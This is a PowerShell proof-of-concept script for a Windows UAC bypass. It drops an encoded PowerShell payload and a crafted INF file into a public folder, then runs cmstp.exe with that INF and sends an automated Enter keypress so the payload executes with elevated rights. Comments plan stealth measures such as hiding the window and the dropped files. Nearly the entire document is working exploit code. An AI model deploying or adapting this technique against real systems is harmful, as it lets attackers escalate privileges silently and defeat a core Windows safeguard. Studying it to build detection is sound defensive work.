# UAC Bypass poc using SendKeys
# Version 1.0
# Author: Oddvar Moe
# Functions borrowed from: https://powershell.org/forums/topic/sendkeys/
# Todo: Hide window on screen for stealth
# Todo: Make script edit the INF file for command to inject...


###############################################################$##############
#WARNING - This script will drop 2 files on disk in c:\users\public\downloads#
##############################################################################



# Insert PowerShell Payload here
$payload = "powershell.exe -w hidden -nop -encodedcommand JABi....."

# Adjust where the payload will be stored
$payload_loc = "C:\Users\Public\Downloads\payload.ps1"


if (Test-Path $payload_loc -PathType leaf)
{
    Remove-Item $payload_loc
    New-Item -Path $payload_loc -ItemType File 
    $payload | Out-File $payload_loc
    #Hiding the payload Powershell file
    #attrib +h $payload_loc
}
else
{
    New-Item -Path $payload_loc -ItemType File 
    $payload | Out-File $payload_loc
    #Hiding the payload Powershell file
    #attrib +h $payload_loc
}


$pay_exec = '; No longer needed - embedded in script now
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\Downloads.\payload.ps1
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"'



$pay_loc = "C:\Users\Public\Downloads\CorpVPN.inf"


if (Test-Path $pay_loc -PathType leaf)
{
    Remove-Item $pay_loc
    New-Item -Path $pay_loc -ItemType File 
    $pay_exec | Out-File $pay_loc
    #Hiding the file
    #attrib +h $pay_loc
}

else

{
    New-Item -Path $pay_loc -ItemType File 
    $pay_exec | Out-File $pay_loc
    #Hiding the file
    #attrib +h $pay_loc

}




$InfFile = "C:\Users\Public\Downloads\CorpVPN.inf"

Function Get-Hwnd
{
  [CmdletBinding()]
    
  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
  )
  Process
    {
        $ErrorActionPreference = 'Stop'
        Try 
        {
            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
        }
        Catch 
        {
            $hwnd = $null
        }
        $hash = @{
        ProcessName = $ProcessName
        Hwnd        = $hwnd
        }
        
    New-Object -TypeName PsObject -Property $hash
    }
}

function Set-WindowActive
{
  [CmdletBinding()]

  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
  )
  
  Process
  {
    $memberDefinition = @'
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

'@

    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
    $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
    If ($hwnd) 
    {
      $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
      [User32.Api]::SetForegroundWindow($hwnd)
      [User32.Api]::ShowWindow($hwnd, 5)
    }
    Else 
    {
      [string] $hwnd = 'N/A'
    }

    $hash = @{
      Process = $Name
      Hwnd    = $hwnd
    }
        
    New-Object -TypeName PsObject -Property $hash
  }
}

#Needs Windows forms
add-type -AssemblyName System.Windows.Forms

#Command to run
$ps = new-object system.diagnostics.processstartinfo "c:\windows\system32\cmstp.exe"
#$ps.Arguments = "/au c:\cmstp\UACBypass.inf"
$ps.Arguments = "/au $InfFile"
$ps.UseShellExecute = $false

#Start it
[system.diagnostics.process]::Start($ps)

do
{
    # Do nothing until cmstp is an active window
}
until ((Set-WindowActive cmstp).Hwnd -ne 0)


#Activate window
Set-WindowActive cmstp

#Send the Enter key
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
